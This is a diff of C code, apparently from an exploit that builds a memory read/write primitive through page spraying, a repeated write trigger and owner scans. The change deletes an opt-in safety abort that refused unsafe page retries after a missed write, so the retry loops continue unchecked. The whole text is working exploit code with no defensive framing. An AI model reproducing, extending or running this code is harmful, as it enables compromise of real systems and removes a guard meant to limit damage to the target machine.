@@ -703,21 +703,16 @@ int rwf_install(void) {
   /* GL_REPAIR_LANDED_ONLY: only track spray pages whose round provably
    * landed (the repair then touches only pages we know we dirtied) */
   int landed_only = getenv("GL_REPAIR_LANDED_ONLY") != NULL;
-  int abort_connected_miss = getenv("GL_ABORT_CONNECTED_MISS") != NULL;
 
   uintptr_t arr0 = rwf_arr_qword(RWF_A0_ARRAY);
 
   /* each round retries: a route "connect" only lands the write ~1/3-1/2 of
    * the time; the owner scan / self-tests are the land detectors */
   for (int t = 0; t < 3 && rwf_a0 < 0; t++) /* fail fast: outer retry re-reclaims */ {
-    int conn = rw_trigger(RWF_SELF_PAGE, arr0);
+    rw_trigger(RWF_SELF_PAGE, arr0);
     rwf_a0 = rwf_scan_owner("map-a0", -1, -1);
     if (!landed_only || rwf_a0 >= 0)
       rwf_track_spray(page_base);
-    if (conn && rwf_a0 < 0 && abort_connected_miss) {
-      rwf_err("rwf map-a0 connected miss — refusing unsafe page retry\n");
-      return 0;
-    }
   }
   if (rwf_a0 < 0) { rwf_err("rwf map-a0 failed\n"); return 0; }
   rwf_pin_owner(rwf_a0);
@@ -743,14 +738,10 @@ int rwf_install(void) {
   }
 
   for (int t = 0; t < 3 && rwf_rd < 0; t++) {
-    int conn = rw_trigger(RWF_SELF_PAGE, rwf_arr_qword(RWF_RD_ARRAY));
+    rw_trigger(RWF_SELF_PAGE, rwf_arr_qword(RWF_RD_ARRAY));
     rwf_rd = rwf_scan_owner("map-rd", rwf_a0, -1);
     if (!landed_only || rwf_rd >= 0)
       rwf_track_spray(page_base);
-    if (conn && rwf_rd < 0 && abort_connected_miss) {
-      rwf_err("rwf map-rd connected miss — refusing unsafe page retry\n");
-      return 0;
-    }
   }
   if (rwf_rd < 0) { rwf_err("rwf map-rd failed\n"); return 0; }
   rwf_pin_owner(rwf_rd);
@@ -786,10 +777,6 @@ int rwf_install(void) {
       }
       SYSCHK(close(holder[0]));
       SYSCHK(close(holder[1]));
-      if (!landed && abort_connected_miss) {
-        rwf_err("rwf retarget connected miss — refusing unsafe page retry\n");
-        return 0;
-      }
       if (landed_only && !landed)
         goto retry;
     }
